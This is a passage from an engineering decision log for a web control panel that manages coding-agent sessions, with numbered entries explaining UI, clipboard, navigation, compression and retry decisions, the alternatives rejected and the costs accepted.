in-flight thing in that file gets), the other has spent its schedule and is waiting for
`attachWanted` on the next poll a session list survives (`stalled`, wearing
`AlertTriangle` — the honest glyph rather than the reassuring one). Neither offers an
action, for the reason the "try again" button was deleted: there is nothing for the
reader to do.

**Two arms lost a `!loadingHistory` clause**, deliberately: at `unfetched === 0` a
destroyed prefix is a permanent fact about the daemon that no run can change, and the
clause existed only to avoid a one-frame flash. Dropping it is what makes the partition
total, and a total partition is the thing that can be asserted.

**Rejected — a count of held events as the "is anything on screen" test.** It is off by
orders of magnitude in the direction that matters: 500 held events draw one row, 2856
draw fourteen. `rows` is a parameter for that reason.

**Status.** Current

#### Q3.423 — Where is "loading N earlier events" drawn, and why did it move twice?

**Decision.** Above the rows, with the other three visible arms of
`transcriptNotice`. It sat below `WaitingFoot` for two revisions and is back.

**Why it went to the foot.** Opening a session pins `scrollTop` to `scrollHeight`,
so the reader lands at the tail; a sentence at the head is thousands of pixels
above them, on precisely the slow connection that produces it, and the
`role="status"` region meant a screen reader heard what a sighted reader did not.

**Why it came back.** Reported from a phone with a screenshot: `loading 2 293
earlier events…` sitting under the last thing the agent said, below `working…`,
reads as a piece of the page that has come adrift — the report was that this is
definitely not how it should look, and that the loading belongs somewhere up at
the top. Both readings are correct about
different things, and the tie-break is what the sentence is **about**: all four
arms answer "why does this conversation not start at its beginning", the events they name
arrive at the top, and a line about them at the bottom is describing somewhere
else. A notice that is merely unseen is a smaller defect than one that is seen and
looks broken.

**The cost, restated rather than rediscovered.** Parked at the tail you may not see
the line; when a run finishes the line leaves and everything below it shifts up by
its own height, because it carries no seq and `grewAbove` neither sees it arrive nor
sees it go. Somebody at the bottom is pinned there by the same effect and sees
nothing move; somebody parked in history sees one line of drift, once. The live
region is unchanged, so the reader who cannot see it is the one who was already
being told.

**Rejected — a floating pill at the top of the scroller**, the mirror of the
`latest` button, which would have been visible from anywhere and cost no layout at
all. It is a new overlay idiom on the transcript for a transient sentence, and the
placement question was the operator's to settle.

**Status.** Reversed an earlier decision

#### Q3.424 — Why is copying one function, and why is there no copy button on a message?

**Decision.** Every copy in this app goes through `copyText` in `ui/clipboard.ts`,
which falls back to `document.execCommand("copy")`. There are three call sites and
none of them is in the transcript's messages.

**Why one function.** `navigator.clipboard` exists **only in a secure context**,
and this app is routinely served from one that is not: the control plane answers on
a plain-http LAN address, which is how it is read beside the machine the agents run
on and over a tailnet from a phone. Measured on the running stack at
`http://192.0.2.10:7888` (the real LAN address, written here as TEST-NET-1):
`window.isSecureContext` is `false`,
`navigator.clipboard` is **`undefined`** — absent, not refusing — and
`document.execCommand("copy")` returns `true`. There were three hand-rolled copies
(`Markdown.tsx`'s code block, `OneTimeSecret.tsx`, `AgentsPanel.tsx`'s device code),
each with its own `catch` explaining the silence away, and each therefore a control
that did nothing on the deployment it was written against — the enrollment secret
and the device code being exactly the two values this app tells you to read once.
All three now call the shared function, and `webcheck` pins that `navigator.clipboard`
appears in `ui/clipboard.ts` and nowhere else under `packages/web/src`, plus the
reverse half: that the fallback is still in it.

**The per-message copy button was built, shipped to the local stack and taken back
out the same evening**, withdrawn by the same request that had asked for it as a
call made too quickly. It is recorded here rather than left in the log because the
next person to want one should start from what it actually cost: a control under
every text run and every bubble, always drawn (a hover-only control does not exist
on a phone, which is what this transcript is read from), at 24px of quiet glyph
whether or not anybody ever used it. That last part is the finding — the button is
cheap to write and permanent to look at, and the transcript otherwise carries
**one** control in total.

Three things it had to get right, kept here so they are not re-derived: what it
copies is the markdown **source**, which is the only form this client holds and the
one worth pasting; the control has to hang **outside** the memoised `Markdown`
child, because interpolating anything into that string reparses the run on every
arriving chunk; and machinery gets nothing — tool calls, folded runs, plans,
permissions, diffs, gaps are the transcript's own words about what happened rather
than anybody's message, and the composer's optimistic echo is a message that has
not been accepted yet.

**What survives it is the clipboard module**, which was never about the button: it
fixes three controls that were already there and already broken.

**Status.** Current

#### Q3.425 — The app has a mark now. Where does it go, and what happened to the working dot?

**Decision.** Three places, one shape. `Mark` in `ui/Mark.tsx` replaces the
placeholder square in the rail's header beside the name — now capitalised,
**Reemoat** — `WorkingMark` replaces `WorkingDot` at the foot of a transcript, and
`public/favicon.svg` is the same mark knocked out of a dark badge.

**The geometry is duplicated from the landing page, deliberately.** Three rounded
bars on a 170×192 canvas, bar width 50, radius 16.43; the source lives in
`reemoat_landing/logo/` with a README carrying the same table. Both ends inline it
rather than linking an asset, and here that is a CSP fact rather than a taste: this
document is served `img-src 'self' blob:`, so a `data:` URI favicon is refused
outright and an `<img>` would be a second request before the first paint on a
phone. The bars are **not** symmetric — left `y=35.5 h=121`, right `y=36 h=120` —
which is in the original export, invisible at any size drawn here, and written down
in both places so nobody straightens one copy.

**The working row gave up something to gain the mark.** `WorkingDot` was
`TONE_DOT.running` reused, so the foot of a transcript and a running row in the
rail were one object that could not drift; they are two now. At 8px in a list of
rows a dot is the right mark and a three-bar glyph is mush, while the foot of a
conversation has room for the thing this app actually is. The rail is untouched, and
the assertion that only `running` blinks is worth more rather than less — the blink
now has one user, so a stray second one is easier to add unnoticed.

**The animation is the third keyframe in this app**, and the bar for adding one is
that it answers a complaint: opacity only, floored at 0.25 rather than 0 (three
bars going fully out reads as a mark disassembling, i.e. as a rendering fault),
1.05s against `blink`'s 1.2s so the two do not beat in lockstep and imply one
mechanism, and a 140ms stagger that makes it the three-dot typing indicator nobody
has to be taught to read. The stagger is three `[animation-delay:…]` utilities
rather than arithmetic: Tailwind emits a class only for a literal it finds in the
source, and a computed delay emits nothing at all — the failure being three bars
pulsing in unison, which is a different animation that still looks deliberate.
Under `prefers-reduced-motion` the block at the foot of `index.css` collapses it to
one 0.01ms pass with no fill mode, so the bars settle at full ink: a still mark, with
the word `working…` beside it still carrying the meaning.

**Verified** against the built stylesheet: `@keyframes bar` and all three utilities
are emitted (the delays minified to `.14s`/`.28s`, which is what a grep for `140ms`
misses), and the three rects compute to `animation-name: bar`, `1.05s`, and delays
`0s / 0.14s / 0.28s`.

**Status.** Current

#### Q3.426 — When does the conversation move on its own, and how fast?

**Decision.** Two rules, and they are deliberately different. **Sending pins the
transcript to its foot, instantly.** **The *latest* button travels there, smoothly.**

**Sending.** Scrolling up to re-read something and then writing a message is
ordinary, and it used to leave the reader in history while their own message and
the whole reply landed below the fold — nothing followed the tail again until they
scrolled by hand. Sending is the clearest statement there is that the newest end is
the one you want. The bridge is a counter on `SessionView`, bumped by `Composer`'s
`onSent` and read by `Transcript` as *"it changed"*: the two are siblings, because
the composer sits **outside** the conversation region on purpose, so the one
component that renders both is the only place they can meet. It fires on the
optimistic half, beside the echo and the cleared box, and inside the `onScreen()`
arm — on the `late` door the session that sent the message may not be the one on
screen, and scrolling *that* conversation would move a transcript nobody was
writing into. `atBottomRef` is written beside the state because the ref is what a
callback outliving that render sees.

⚠ **That last clause used to read "the composer grows by the height of the echo in
the same commit, and the `ResizeObserver` that notices the box shrinking is what
finishes the job", and it stopped being true in Q3.436.** The echo is a row *inside*
the scroll box now rather than a child of the composer below it, so it adds
`scrollHeight` and touches `clientHeight` not at all — exactly like the working
line — and the one `scrollTop` assignment already lands on the finished height. The
observer is unchanged and is still needed for every other cause it was written for:
the composer growing as you type, a phone's soft keyboard, a dismissed banner.

**The button.** It assigned `scrollTop` and set `atBottom` in one tick, so the
conversation teleported: on a long transcript there was no telling "jumped to the
end" from "the page re-rendered", and nothing said which way the end had been.
`scrollTo({behavior: "smooth"})` says the direction and roughly the distance, which
is the whole reason somebody taps it rather than flicking.

**`setAtBottom` is gone from that handler, and that is the load-bearing half.** It
would fire the pinning effect on the next commit, which assigns `scrollTop`
outright — an instant jump eating the animation it was meant to accompany. Nothing
needs telling: `measure` runs on every scroll event, including the ones a smooth
scroll emits, so the flag flips when the box arrives and the button disappears at
the end of the journey rather than the start of it. An interrupted scroll leaves it
on screen, which is the truth.

**Why one is instant and the other is not.** The button is a journey somebody asked
for and wants to watch. Sending is the ground being put back under a message
already being written, and an animation there would scroll the page out from under
the composer at the exact moment that message appears above it.
`prefers-reduced-motion` is read at the tap and thrown away, because
`behavior: "smooth"` is not reachable by the CSS block in `index.css` that collapses
every other animation in this app.

**Status.** Current

#### Q3.427 — Which element names a settings screen?

**Decision.** The sheet's head names the **pop-up** — `Settings`, and
`New session` for the other caller — and the screen's own name is
`settingsPaneTitle`, drawn by the pane, withdrawn there with
`up.withinNav ? "sm:hidden" : ""`. That is character-for-character the expression
`Sheet` already uses for the chevron, because it was always one argument about a
screen's identity rather than two. `SHEET_HEAD`'s heading becomes an `<h1>`.

**Why.** `SHEET_HEAD` is a child of `SHEET_PANEL`, so at `sm` and above it spans
the 224px section rail **as well as** the pane beside it — and the only string
true of everything under it is the pop-up's name. It was drawing the *pane's*
name, so at `/settings/machines/:id/agents` the words `mac · agents` sat above a
rail whose four rows read Machines / Account / Server settings / Users, with
Machines highlighted. At the four section depths it was drawing a second copy of
the highlighted row. `withinNav` already answers "does the rail draw this screen
as a row", which is exactly the question of whether the pane needs to say it, so
no predicate had to be invented and `webcheck`'s six pinned answers carry the new
behaviour unchanged.

**Measured.** At 1280px the head's text box starts 40px from the panel's left
edge and the rail is 224px wide, so 184px of the title was drawn over the rail.
The `<h1>` promotion is free: `syncInert` puts `inert` on `#root` for the life of
any sheet and `inert` implies `aria-hidden`, so `SessionBrowser`'s own `<h1>` is
out of the accessibility tree; `SignIn` and `GateCard` never coexist with a
sheet; and nothing in `index.css` styles a heading element, so neither caller
moves a pixel.

**Alternatives.** Four, all taken out. Reading the viewport in JavaScript —
forbidden here, and `AppShell` says why. A two-span title (`sm:hidden` /
`hidden sm:inline`) inside the `aria-labelledby` target — rejected on the
accessible-name hazard: the name would be computed across a `display:none`
sibling, which is engine-dependent and, in a repo with no DOM harness, could not
be asserted; its failure mode is a dialog name that silently varies with the
window. A `heading` prop on `Sheet` — fires on `NewSession`, which has no pane to
be a hierarchy for. And moving the ◀ into the pane beside the title — rejected
because it costs 44px of permanent chrome inside a panel whose *definite* height
is load-bearing (see `SHEET_PANEL`), plus a second border directly under a 56px
head, on the device this app is shaped around.

**What it does not supersede.** Q3.213's assignments both stand: the ✕ is
`useUnder` and leaves settings entirely, the ◀ is `settingsUp` and goes one level
up. Only the title moved. Q3.415's sentence that the ✕ "walks one level up" was
already wrong when written and is corrected there rather than here.

**Known residual.** The pane heading is an ordinary in-flow block, so it scrolls
away — where the head named the screen permanently. Scroll deep into Account on a
phone and nothing on screen says which screen it is. The remedy is one wrapper
(`flex min-h-0 min-w-0 flex-1 flex-col`, the heading `shrink-0`, today's scroller
unchanged and its `min-h-0` not optional) and was not taken, because it buys back
the chrome the alternative above was rejected for. Open.

**Status.** Current

#### Q3.428 — Does a machine that has already enrolled still get offered a setup code?

**Decision.** No. `MachinesSection`'s kebab draws `Setup code` only while
`!machine.enrolled && !machine.overLimit`; an enrolled machine's menu is Rename
and Retire. `POST /v1/machines/:id/enrollments` is untouched and still allows a
re-mint — this is a decision about what the row offers, not about what the fleet
permits.

**Why.** "New setup code" on a host that is already running reads as a step you
still owe, and a menu that offers one is a menu lying about what is left to do.
That was the whole complaint and no wording fixes it: a demoted label
("Replace setup code…") was built, deployed and then taken back out, because the
row is still there and still reads as an option you have not taken.

**What it costs, measured before it was chosen.** Six flows leave the phone and
become `cpctl enroll <machineId>`: re-installing a host; rotating a machine's
tunnel credential after a suspected leak — and that is the **only** rotation this
fleet has, since `issueTunnelKey` is called at exactly one place, inside
`POST /v1/enroll`; picking up a relay that did not exist at enrollment, which
`daemon.ts` prints as the remedy in so many words; repairing a damaged identity
row; following a signing-key rotation; and moving to a new control-plane URL.
`cpctl enroll` is the owner's own path and needs no admin, but it needs a
terminal, a checkout and a `cpctl login` — a credential `SignIn` deliberately
cannot issue.

**⚠ Retire-then-Add is not the substitute**, and the row's own comment says so.
It mints a **new** machine id, so the fleet-wide name changes; it keeps only the
creator's grant, so anybody the machine was shared with loses access with nothing
said; and it cannot be undone, a revoked machine being refused adoption.

**Alternatives.** Two, both taken out. Keeping the act behind a verb that says it
supersedes something — rejected above; it shipped for one deploy. Drawing the row
only while the machine is not `online`, so it appears exactly when somebody is
repairing an unreachable host — rejected on two counts: the leak case wants the
rotation on a machine that *is* answering, and the row would then appear and
vanish under a thumb on the four-second reachability poll.

**Status.** Current

#### Q3.429 — What tells somebody that choosing ultracode restarts the agent?

**Decision.** The choice row does, before the tap. `choiceRefusal` draws the
sentence on the Ultracode row while `turnInFlight` is true, the row keeps full
contrast, is marked `aria-disabled`, and sends nothing — `Absent`'s bargain moved
one level down from a control to a row. Because the row answers first,
`applyConfigChange`'s catch stops raising a toast for `turn_in_flight` — and for
that code alone, through `meansRestartRefused`.

**Why.** The refusal is real and stays: ultracode is read when a conversation is
*opened*, so no implementation can apply it to a turn already running, and
restarting mid-turn would sweep every parked permission and dispose an agent whose
work the resume does not re-send. What was wrong was where it was said. `Toast.tsx`
renders `fixed inset-x-0 bottom-0`, so the only explanation anybody got was a panel
over the composer's input, raised *after* a tap, for a refusal this client could
have predicted from the snapshot it already holds.

**Both directions, and one sentence when it is true of several rows.** Leaving
ultracode restarts as hard as entering it — an ordinary level clears the flag first
— so with it on, every level is refused at once; six copies of one sentence in one
panel becomes one line above them, hoisted only when every refusal is the same
string, and drawn *beside* the control's own description rather than instead of it.

**`turnInFlight` and neither of the two predicates already reading that field.**
`showsWorking` carries `!needsHuman` and goes false while a permission is parked —
which is a state the daemon still refuses in, so the warning would vanish exactly
where it was needed. `canCancelTurn` drops `stopping` and terminal, where the
daemon answers `session_terminal` instead, a refusal that is *not* suppressed.

**The suppression is the risky half and is fenced accordingly.** One code, keyed on
the code and never the status (`409` is also `session_busy` and
`session_not_ready`, both still loud); `restartsAgent` is written as a **superset**
of the daemon's gate, since a false negative is now a silent no-op rather than a
toast; and `webcheck` pins that the strip still calls `toast(` twice and
`meansRestartRefused(` exactly once, which is what stops this catch degenerating
into `catch {}`. It fails open: rename the code on the daemon and the toast returns.

**Alternatives.** Three, taken out. Deferring the restart to turn end — it would
fire `doStop` from the turn pump's `finally`, sweeping parked permissions beside
`startIdleDrain` with nobody watching, and would leave the chip reading `Ultracode`
while the agent went on running the old conversation without it. Authoring the
sentence through `choiceOverride` — `rowDescription` is `own ?? override`, so it
would be shadowed silently the day claude describes an effort level. And dimming
the row — the argument at `Absent` applies unchanged: a greyed inert control
answers "why can I not tap this?" with silence on a phone, where there is no
tooltip.

**Known residue.** A turn that starts between the frame that drew the row and the
finger that hits it still reaches the suppressed catch: the chip flicks
`Adaptive → Ultracode → Adaptive` with nothing said for up to one poll. Three
surfaces correct it within seconds — the row, Send becoming Stop, and the
composer's own placeholder. Accepted rather than fixed, the alternative being a
reveal channel built for one race.

**Status.** Current

#### Q3.430 — What does the sign-in card say once the flow has finished?

**Decision.** The spent code and the dead link are dropped at the source:
`readLoginTranscript` returns `url: null, code: null` in both the `done` and
`failed` branches. The card then states the outcome itself, through
`loginOutcome` — a five-arm total partition over checking / signedIn /
notSignedIn / cannotTell / unreachable — instead of the line it used to draw,
"Finished. The status above says whether it worked." The badge reads `checking…`
for the same window, and `rawTranscriptIsOpen` replaces `transcriptIsTheAnswer`
at the call site.

**Why.** A page and a code are *instructions*, not history: after the process
exits there is nothing to open and nothing to type. The bytes still hold both —
no device flow prints that a code was consumed, and `extractCode` reads the newest
match on purpose for the reprint case — so a finished login left a live-looking
code under a badge already reading "signed in". And the outcome was never
unknowable: `finish()` calls `onDone` → `refresh()` in the same batch as
`setDone(true)`, and the read that reported `done` had already dropped the probe
cache, so the answer is fresh. It was simply never passed down.

**`done` is not "signed in", and the partition is what keeps that honest.** The
exit status is deliberately unread — BSD `script` does not propagate it —
`FAILURES` has no success counterpart, and every unmet way of losing lands in
`done` with a null message. So the re-probe is the only oracle, `checking`
outranks `checkFailed` so a retry never shows the error it is clearing, and
`cannotTell` is drawn quietly rather than as an alarm: for kimi it is the ordinary
ending.

**⚠ The trap in fixing it at the source.** `transcriptIsTheAnswer` is "nothing was
recognised", so nulling two fields on exit makes every finished run satisfy it —
and `<details open={…}>` would spring the raw pty pane open under the success
message on every single sign-in, replacing a paragraph of hint with a screen of
terminal. It gains a phase early-return in the same commit. No driver caught this:
both existing calls pass `done: false`.

**Status.** Current

#### Q3.431 — Who is the agent card written for?

**Decision.** Not a developer. `agent.hint` is deleted from both render sites —
`AgentsPanel` and `NewSession`, which drew the same five lines — and what a person
can act on is re-derived client-side in `ui/agentCard.ts`, pure and asserted. The
CREDENTIALS heading goes, the `<details>` "Paste a token" disclosure goes and its
rows become an inline key field under an `or`, a signed-in agent shows one centred
Sign out that becomes the question in place, and the raw environment variable stops
being either the visible label or the accessible name.

**Why.** The daemon's hint is written for whoever runs the daemon — adapter against
CLI, `~/.codex/auth.json`, `session/new … -32000` — and read by whoever is holding
the phone. It stays on the wire untouched, because the same string is the body of
the session-start failure in `session.ts`, where a developer is exactly the reader.

**What survives the cull, and it is one sentence.** Codex's measured caveat
(Q2.200): a pasted key reaches the model's API and still leaves the adapter
answering -32000. It moves to the key field, above the input, before the first
keystroke — not a tooltip, which a phone has none of, and not a toast after
saving. It does not overclaim: "won't start a chat on its own" is true where
"does nothing" would be false, and `webcheck` pins both halves.

**Two things the shape had to bend around.** Claude has **two** credential slots
and they are not interchangeable, so a single "token" field would either write to
the wrong one or hide the other; the rows are per slot, named by what they are,
with one line saying either will do. And kimi has no sign-out at all, so its
signed-in card holds a sentence in the pixels a button would occupy — the route
answers 503 and a button there could not act.

**Measured while doing it.** Four controls were under the 44px floor on a card a
non-technical person is asked to use: the credential input and the wizard input at
~39px (`py-2` against `index.css`'s coarse-pointer 16px rule), the Copy control at
~38px wide — a `Button` wrapping only an `<Icon>`, on the one thing you tap to
capture a code shown once — and "re-check" at roughly 20px.

**Alternatives.** Shortening the hint rather than deleting it — rejected: the
daemon cannot know which reader it has, and the client can. Authoring the
replacement sentences in JSX — rejected because no driver reads `AgentsPanel.tsx`
at all, which is how the stale code survived; they are data in a pure module
instead. Obeying "if signed in, just a Sign out button" literally — qualified,
because hiding the key rows in that state is exactly the bug the `stored > 0`
guard had just closed.

**Status.** Current

#### Q3.432 — Where does the way back live, and what is a machine's own screen?

**Decision.** Two things, and one line opened both. The ◀ moved out of `SHEET_HEAD`
into the pane, pressed against the name of the screen it leaves, and the reserved
12px slot and `Sheet`'s whole `up` prop went with it. And `settingsPath` stopped
welding `/agents` onto the base, which made `/settings/machines/<id>` expressible
for the first time — `MachineSection`, holding the identity line, Name, Agents and
Retire, reached by tapping the row.

**Why the chevron moved.** It sat 40px from the panel's left edge, a whole 56px bar
away from the thing it was a chevron *for*, beside a title that names the pop-up
rather than the screen — and `withinNav` was re-derived independently in two files
that could drift. Q3.427 declined this on the grounds that `Sheet` would be left
declaring a field it no longer read; the prop is deleted rather than half-emptied,
so that objection evaporates instead of being tolerated. The head now holds only
controls that *leave* the pop-up: the ✕ (`useUnder`) and the waiting badge.

**The reserved slot was pure cost.** Its rule is about a control that mounts and
unmounts *in that row*; nothing can mount there any more, so the title's left edge
is constant at every depth with no slot at all. `NewSession`, the other caller, has
never passed `up` — it was 12px of indent on a title that could never have a
chevron.

**The label names the destination.** `settingsUpLabel` is the *parent route's own*
`settingsPaneTitle`, so a label naming a screen the path does not resolve to is not
expressible. `Sheet`'s bare `label="Back"` was already in violation of `Header`'s
rule, and a bare "Back" sitting immediately before a heading naming a different
screen would have been worse than neutral.

**Why the address already half-existed.** `parseSettingsRoute` has always answered
the byte-identical object for `["machines","m_1"]` and `["machines","m_1","agents"]`
— the machine's screen parsed and rendered, and nothing could emit its address,
because `settingsPath` put `/agents` in the base. Moving that literal into the agent
arm is the whole routing change; the parser is untouched, and the docblock promising
that a non-`agents` third segment "drops to the machine's own screen" stops being
aspirational.

**Measured, and the reason the row had to stop being a control panel.** It carried a
navigate button, a kebab holding three acts, an inline rename form, a one-time
secret and a two-step confirmation — five affordances on one 56px line — and the
name, the only flexible child beside three `shrink-0` groups, rendered at **0px**
inside the sheet at 1280px (Q3.227). A `<button>` may hold no interactive
descendant, which is the second and independent reason the kebab could not survive:
the row is a link now, `AgentChooser`'s shape verbatim, so the two depths read as
one object. Depth is exchanged rather than added — machines → chooser → agent was
three levels and machines → machine → agent is three, because the chooser stopped
being a screen and became a section.

**A machine you do not own gets the same link.** `Agents` already sat outside the
ownership gate (Q3.415) because configuring an agent is an act on the *daemon*,
reached with a `session:write` grant, while rename and retire are acts on the
registry, which answers 404 rather than 403. So a non-owned row already meant "one
tap, to a real screen"; the destination simply arrives without the owner-only
blocks. An unopenable row wearing a chevron would be a control lying about the
state it is drawn in.

**⚠ Retire navigates before the store drops the machine**, in that order. Reversed,
the component is still mounted on `/settings/machines/<id>` when `machinesChanged`
removes it, and the person reads "That machine is not in your list any more" about
the machine they just deliberately retired. `webcheck` pins the ordering by index,
which is the only guard on a runtime sequence in this file.

**Known residue.** The re-mintable setup code now lives behind a navigation, and
this screen has six exits (◀, ✕ to a different destination, the scrim, Escape,
Android Back, the rail) against a row's one — a one-time value is easier to lose
here. It is never shown twice: `AddMachine`'s code, the one almost everybody sees,
stays on the list screen. And at the agent depth the pane reads `◀ Back to mac`
beside a heading also reading `mac`, because Q3.427 keeps the agent named one rank
below by `AgentDetail` — which is mounted a second time by `NewSession` with no pane
above it, so it cannot give that name up. Open.

**Status.** Current

#### Q3.433 — What titles a machine's screen, and how much status belongs on it?

**Decision.** "Machine settings", a constant — so `settingsPaneTitle` no longer
takes a machine name at all, and neither does `settingsUpLabel`. The reachability
`Dot` is gone from that screen; the list keeps it.

**Why the name left the heading.** It put the same word in three places within one
scroll — the heading, the rename field directly beneath it, and the Retire button —
so the chrome was restating the body. The name belongs where it is *editable* and
where it is *destroyed*; the heading says what kind of screen this is. Making it a
constant is the load-bearing half: nothing in the pop-up's chrome is now a function
of which machine you opened, so a heading cannot disagree with the body under it,
and a machine revoked in another tab leaves the screen named while `MachineSection`
draws the tombstone beneath. `webcheck` pins the arity, not only the string.

**Why all of the status left, not only the dot.** Reachability is a fact about the
*fleet*, and the list one level up already carries it on every row as a dot and a
subline — which is where it is scanned, eight rows at a glance. Repeating it in the
chrome of a screen you opened deliberately is the same restatement the heading was
performing when it drew the machine's name. So the dot, the badge and the standing
sentence all go, and this screen holds settings only. The dot also rendered badly
on the way out: it sat in a flex row of its own above the paragraph, so with no
badge to keep it company it was a lone 8px mark on an otherwise empty line.

**One line survives, and it is not status.** A machine you do not own says so,
because that is what explains the *absence* of the Name and Retire sections —
"every control true in the state it is drawn in" read from the other side. Without
it a grantee meets a screen holding only Agents with nothing saying why.

**What that costs, stated rather than hidden.** An over-limit machine no longer
carries its remedy here ("retire another to bring it back") beside the Retire that
performs it, and a machine whose owner is banned no longer explains itself. Both
sentences are still on the row one level up, which is where the reader met the
machine before opening it.

**Consequence, stated rather than hidden.** At the agent depth the chevron now
reads `◀ Back to Machine settings`. That is wordier than `Back to mac`, and it is
the price of the label being derived from the parent's own name — the property that
makes a label naming a screen the path does not resolve to inexpressible. The
alternative was a second table of names for chevrons to read, which is the drift
`settingsUpLabel` exists to prevent.

**Status.** Current

#### Q3.434 — Does a pop-up still owe the waiting count?

**Decision.** No. `WaitingHere` is deleted from `Sheet`, so neither settings nor
`/new/:machineId` draws an "N waiting" badge. This reverses Q3.201.

**Why.** The obligation that entry states is real — a settings screen which hid
every blocked row is the failure this app is shaped around — but it was discharged
by a change underneath it rather than by the badge. Settings stopped *replacing*
`SessionBrowser` in the aside and became a pop-up over it, and covering the rail
with a scrim is not replacing it: at `sm` and above the rail is on screen, with a
blocked count on every folder header, so the badge was a second copy of a number
three inches to its left. Q3.201's own text says the reason "moved"; what it did
not re-ask is whether the badge was still the thing carrying it.

**⚠ What it costs, and it is not nothing.** On a phone the sheet really does cover
the list — 92dvh of it — so a session that starts waiting while somebody is in
settings is now unannounced until they close it. That is a genuine regression
against Q3.201's stated purpose, taken deliberately: the screen is settings, the
reader went there on purpose, and a counter that is right twice a day is the kind
of thing people stop reading. The rail's own signals are unchanged and are what the
count was ever a proxy for.

**Status.** Current

#### Q3.115 — Nothing compressed anything. What crosses the wire now?

**Decision.** `gzipResponses` in `src/http.ts`, registered as the first middleware
in both services — the daemon's app and `createControlPlaneApp`. It packs a response
when the caller offered gzip, the body is over `COMPRESS_MIN_BYTES` (8 KiB), and
`compressible` admits its **content type**.

**Why.** Nothing in this system compressed anything: not the daemon, not the control
plane, and deliberately not the relay, which carries h2 frames and says so at
`tunnel-endpoint.ts`. So a transcript page of 5000 events crossed a home uplink at
**1.23 MB** where it gzips to **98 KB**, and the web bundle — the first thing a phone
fetches, before a single event — at **625 KB** where it gzips to **187 KB**. Measured
end to end afterwards: 1 233 905 → 97 643 B on the daemon (12.6×, 20 ms) and
639 864 → 192 391 B on the control plane (3.3×). The scarce resource on this path is
the *upstream* of the machine an agent runs on, and every byte of a transcript
crosses it twice — once to the relay, once to the browser.

**It was found by chasing the wrong thing first.** Raising the page to 5000 events
(Q3.114) cut 68 round trips to seven and made the *first paint* 23× more expensive:
until the first window lands a transcript has no rows, so `transcriptNotice` answers
`skeleton`, and the skeleton now covered a 1.23 MB transfer instead of a 54 KB one.
Reported as "eternal loading with the skeleton". Compression is what makes the big
page a pure win rather than a trade — 98 KB is *cheaper* than the 500-event page it
replaced, for ten times the events.

**Keyed on the content type, never on the path, and that is the load-bearing half.**
`GET /sessions/:id/files` and `/uploads/:uploadId` stream arbitrary bytes as
`application/octet-stream`, and the client refuses an oversized file by reading
`content-length` **before** the body is resident — `Content-Length` being the one
size header CORS exposes without `Access-Control-Expose-Headers`. Compressed, that
number describes the packed size, so the 100 MiB guard silently measures the wrong
quantity. A path test does the same job today and fails open the day somebody adds a
route that streams bytes, which is the argument `readCredential` already makes for
keying on the `upgrade` header rather than on the stream route's path. `daemoncheck`
drives that exclusion on a 40 KiB file rather than asserting the predicate alone,
because the fixture's other file is three bytes and would pass either way.

**Three things it declines**, each for its own reason: a body somebody already
encoded, anything under the threshold (below a packet or two the CPU and the `Vary`
cost more than the bytes saved), and an upgrade request — a WebSocket handshake this
touched at all would be a failure with no obvious cause, so it is excluded by the
content-type test *and* by an explicit check.

**It rewrites `content-length` rather than deleting it.** A client that reads that
header — and this one does, for downloads — must never see the uncompressed number
beside a compressed body.

**Status.** Current

#### Q3.114 — Why does a long conversation load slowly and in pieces, and what bounds it now?

**Decision.** Three limits, and two of them are deleted rather than tuned.
`MAX_TRANSCRIPT_BYTES` (16 MiB) is the tab's **only** ceiling; the 20 000-event
`MAX_TRANSCRIPT_EVENTS` is gone; and `HISTORY_PAGE`/`EVENTS_PAGE_LIMIT` go from 500
to 5000.

**Why the count had to go rather than grow.** It is a bound on a browser tab, so
what it expresses is memory — and an event ranges from 68 B (a text delta) to
`truncateEvent`'s own 128 KiB cap, so a count is a memory bound only by luck.
Measured on one session: at 20 000 events it stood for **49 MiB** while a tool call
was typing its arguments one token at a time, and **2.8 MiB** for the same session
once those drafts were emptied. One number, two completely different tabs. What it
*did* was cut a 33 898-event conversation at seq 13 989 — three of its six prompts
and its own first message gone — on a transcript that costs 4.53 MiB and 9 ms to
hold whole.

**Raising it was tried first, and that is the instructive part.** 50 000 beside a
16 MiB ceiling still leaves the *count* firing first on light events: 50 000 × 140 B
is 7 MiB. So the truncation survives at exactly the size that must never be
truncated, further out and harder to notice. **Two ceilings on one resource means
the wrong one decides**, which is the general form of it.

**What the page limit actually was.** A round-trip count in disguise: a window spans
`HISTORY_PAGE` *seqs*, so 500 meant 68 sequential requests for that session, each a
full relay round trip before the next could be asked for. That is the whole of
"loads slowly and in pieces". Measured after: **seven** requests for 33 898 events,
and one for a 2856-event session. Raising it is free because it was never the bound
that mattered — `EVENTS_PAGE_BYTES` (2 MiB at the time of this decision; lowered to
768 KiB afterwards by Q6.104, which does not change the argument) caps a page, and
`fillWindow` already refills a byte-capped window from the last seq it received — so
a heavy conversation degrades to exactly the request count it costs today. The
daemon's side is unchanged in memory too: `read` fills a page through `iterate()`
and breaks on the byte budget.

**The price, stated.** Nothing bounds the array's length now, so `buildTail`'s walk
— which runs on every streamed token — is 9 ms at 33 898 events and about 32 ms at
the ~120 000 events that 16 MiB of 140-byte events would be. That is a frame rate
rather than a truncation, and it is the right way round: a conversation that arrives
whole and redraws slowly can be read, and one that is cut cannot.

**How the bytes are counted.** `sizeOfEvent` is one `JSON.stringify` per event,
memoised in a `WeakMap` on the event's identity — valid because `StoredEvent` is
never mutated — so no event is measured twice however many times it is counted, and
`onEvents`' trim subtracts what *left* rather than re-measuring what stayed.
Approximate on purpose: it decides when to stop fetching, never what to draw.

**Two assertions changed shape rather than value.** `webcheck` pinned
`ATTACH_REPLAY_MAX < MAX_TRANSCRIPT_EVENTS` — two numbers pinned as *different*
numbers, because conflating them was the defect (Q3.19). With no second number that
inequality would have become vacuous, so it is a source assertion now:
`reattachSince` may name the daemon's bound and no other. And `daemoncheck`'s "a
page is clamped to what one request may carry" asked for `limit=5000` and expected
500 — with the page at 5000 its fixture could no longer exercise a clamp at all,
because the whole live log was smaller than one page. Its cap and seed are derived
from `EVENTS_PAGE_LIMIT` now, which is exported for that reason.

**Status.** Reversed an earlier decision

#### Q3.113 — How long should a failed history page be retried?

**Decision.** `[500, 2 000, 5 000, 10 000, 20 000]` ms — five waits, 37.5 s in all —
and for transport failures **plus** the three answered refusals `meansLater` admits:
`unreachable`, `no_tunnel` and `tunnel_failed`.

**Why.** The number is the daemon's, not this client's: a relay recreated by a deploy
answers `no_tunnel` until the daemon redials, and that redial is its own 1 s→30 s
full-jitter backoff. A schedule that stops before 30 s hands the reader a truncated
conversation for the difference, and `loadAll` pages **backwards**, so what is missing
is always the beginning.

